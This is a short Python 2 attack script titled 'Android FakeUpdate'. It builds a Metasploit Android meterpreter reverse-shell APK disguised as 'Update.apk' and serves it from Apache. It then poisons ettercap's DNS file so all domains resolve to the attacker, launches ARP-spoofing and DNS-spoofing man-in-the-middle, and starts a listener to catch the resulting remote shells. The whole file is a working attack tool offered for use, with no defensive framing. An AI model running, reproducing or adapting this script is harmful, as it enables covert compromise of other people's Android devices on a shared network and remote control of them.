import signal

import os

import time

import subprocess



print """
        ##################################################
        ##                                              ##
        ##                                              ##
        ##                                              ##
        ##  Author @intx0x80                            ##
        ##                                              ##
        ##      Android FakeUpdate                      ##
        ##                                              ##
        ##################################################

"""
def signal_handler(signal, frame):

    print "\n[-] Exiting"

    exit()

signal.signal(signal.SIGINT, signal_handler)









def spoof():
	interface=raw_input("Enter interface   : ") 
	
	#ip_gw=raw_input("Enter ip gateway    :  ")
	ip=raw_input("Enter ip     : ")
	c1="msfpayload android/meterpreter/reverse_tcp LHOST="+ip+" R >/var/www/Update.apk"
	os.system(c1)
	#subprocess.Popen('cp ./index.php /var/www/')
	print  "[*]Creating Backdoor For Android ..."
	print "Start Apache Server ......"
	subprocess.Popen('service apache2 start', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
	
	
	try:
                os.chdir('/usr/local/share/ettercap')
                check_dir = os.listdir(os.curdir)
                if 'etter.dns' in check_dir:
                    subprocess.Popen('mv /usr/local/share/ettercap/etter.dns etter.dns.old', stdout=subprocess.PIPE, stderr=subprocess.PIPE, 				shell=True).wait()
                my_etter = open('etter.dns', 'w')
                my_etter.write('*\tA' + '\t'+ str(ip))
                my_etter.close()
        except(OSError):
                print   "[*]Ettercap Launched ... [OK]" 
        dns_spoofing = " xterm -e ettercap -Tqi " + interface + " -M arp // // -P dns_spoof"
        #subprocess.Popen(dns_spoofing, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	Androidlistener="  xterm -e msfcli exploit/multi/handler payload=android/meterpreter/reverse_tcp LHOST="+str(ip)+" E"
	subprocess.Popen(Androidlistener, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	
	subprocess.Popen(dns_spoofing, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
     	
    	
    
if __name__ == '__main__':
        spoof()

